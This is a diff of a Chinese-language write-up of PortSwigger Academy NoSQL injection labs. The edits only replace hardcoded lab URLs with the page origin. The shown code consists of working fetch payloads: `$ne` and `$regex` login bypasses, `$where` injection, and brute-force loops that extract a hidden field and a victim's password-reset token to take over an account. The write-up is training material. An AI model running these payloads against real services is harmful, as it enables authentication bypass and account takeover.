@@ -97,38 +97,30 @@ Bypass Authentication
 嘗試以下，成功登入 `wiener:peter`
 
 ```js
-fetch(
-  "https://0a8500ae0356268985cc85ee0011004e.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({ username: { $ne: "invalid" }, password: "peter" }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({ username: { $ne: "invalid" }, password: "peter" }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 嘗試以下
 
 ```js
-fetch(
-  "https://0a8500ae0356268985cc85ee0011004e.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: { $ne: "wiener" },
-      password: { $ne: "wiener" },
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: { $ne: "wiener" },
+    password: { $ne: "wiener" },
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -141,38 +133,30 @@ fetch(
 嘗試以下，成功登入 `wiener:peter`
 
 ```js
-fetch(
-  "https://0a8500ae0356268985cc85ee0011004e.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({ username: "wiener", password: { $ne: "" } }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({ username: "wiener", password: { $ne: "" } }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 參考 [MongoDB Regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/) 語法，嘗試
 
 ```js
-fetch(
-  "https://0a8500ae0356268985cc85ee0011004e.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: { $regex: "admin.*" },
-      password: { $ne: "" },
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: { $regex: "admin.*" },
+    password: { $ne: "" },
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 成功登入 `adminvqvp4ss7`
@@ -202,7 +186,7 @@ admin' && this.password[0] == 'a' || 'a'=='b
 
 ```js
 fetch(
-  `https://0aa5005e03db982880ee3fc700d20006.web-security-academy.net/user/lookup?user=${encodeURIComponent(`wiener' && '1' === '1`)}`,
+  `${location.origin}/user/lookup?user=${encodeURIComponent(`wiener' && '1' === '1`)}`,
 );
 ```
 
@@ -317,21 +301,17 @@ https://portswigger.net/web-security/nosql-injection#extracting-field-names
 前面卡在不知道登入功能要怎麼 exploit NoSQLi，後來參考答案，原來會用到前面的知識
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -343,42 +323,34 @@ Account locked: please reset your password
 換成 wiener，雖然這題沒有給預設的登入帳密，但還是成功登入了
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "wiener",
-      password: { $ne: "invalid" },
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "wiener",
+    password: { $ne: "invalid" },
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 但這不是重點，這題應該是要用 $where 來探測 passwordResetToken 的欄位名稱，嘗試 $where 能否注入
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "0",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "0",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 確認 0,1 會有不同的回應，接下來就是 Boolean Based NoSQLi 的戰場了
@@ -386,106 +358,86 @@ fetch(
 確認 this 有五個欄位
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "Object.keys(this).length === 5",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "Object.keys(this).length === 5",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 確認有 username, password, email 這三個欄位
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "Object.keys(this).includes('password')",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "Object.keys(this).includes('password')",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 確認以上三個欄位的排序，都不是在第 0 位
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "Object.keys(this)[0] === 'password'",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "Object.keys(this)[0] === 'password'",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 確認第 0 位的欄位長度 = 3
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "Object.keys(this)[0].length === 3",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "Object.keys(this)[0].length === 3",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 確認欄位的排序是
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "Object.keys(this)[1] === 'username'",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "Object.keys(this)[1] === 'username'",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 
 Object.keys(this); // ['_id', 'username', 'password', 'email', '1234567890123']
 ```
@@ -496,22 +448,18 @@ Object.keys(this); // ['_id', 'username', 'password', 'email', '1234567890123']
 async function main() {
   for (let i = 0; i < 13; i++) {
     for (const letter of letters) {
-      const res = await fetch(
-        "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-        {
-          headers: {
-            "content-type": "application/json",
-          },
-          body: JSON.stringify({
-            username: "carlos",
-            password: { $ne: "invalid" },
-            $where: `Object.keys(this)[4][${i}] === '${letter}'`,
-          }),
-          method: "POST",
-          mode: "cors",
-          credentials: "include",
+      const res = await fetch(`${location.origin}/login`, {
+        headers: {
+          "content-type": "application/json",
         },
-      );
+        body: JSON.stringify({
+          username: "carlos",
+          password: { $ne: "invalid" },
+          $where: `Object.keys(this)[4][${i}] === '${letter}'`,
+        }),
+        method: "POST",
+        credentials: "include",
+      });
       const text = await res.text();
       const isTruthy = text.includes(
         "Account locked: please reset your password",
@@ -537,22 +485,18 @@ async function main() {
 接著確定 passwordReset 的長度 = 16
 
 ```js
-fetch(
-  "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: { $ne: "invalid" },
-      $where: "this.passwordReset.length === 16",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: { $ne: "invalid" },
+    $where: "this.passwordReset.length === 16",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 爆破 passwordReset
@@ -562,22 +506,18 @@ async function main() {
   const result = [];
   for (let i = 0; i < 16; i++) {
     for (const letter of letters) {
-      const res = await fetch(
-        "https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/login",
-        {
-          headers: {
-            "content-type": "application/json",
-          },
-          body: JSON.stringify({
-            username: "carlos",
-            password: { $ne: "invalid" },
-            $where: `this.passwordReset[${i}] === '${letter}'`,
-          }),
-          method: "POST",
-          mode: "cors",
-          credentials: "include",
+      const res = await fetch(`${location.origin}/login`, {
+        headers: {
+          "content-type": "application/json",
         },
-      );
+        body: JSON.stringify({
+          username: "carlos",
+          password: { $ne: "invalid" },
+          $where: `this.passwordReset[${i}] === '${letter}'`,
+        }),
+        method: "POST",
+        credentials: "include",
+      });
       const text = await res.text();
       const isTruthy = text.includes(
         "Account locked: please reset your password",
@@ -593,7 +533,7 @@ async function main() {
 }
 ```
 
-訪問 https://0a71001a039ff6c081d202b100e900bd.web-security-academy.net/forgot-password?passwordReset=6c8f141b7a877397，重設密碼即可通關
+訪問 `/forgot-password?passwordReset=6c8f141b7a877397`，重設密碼即可通關
 
 ## Exfiltrating data using operators
 
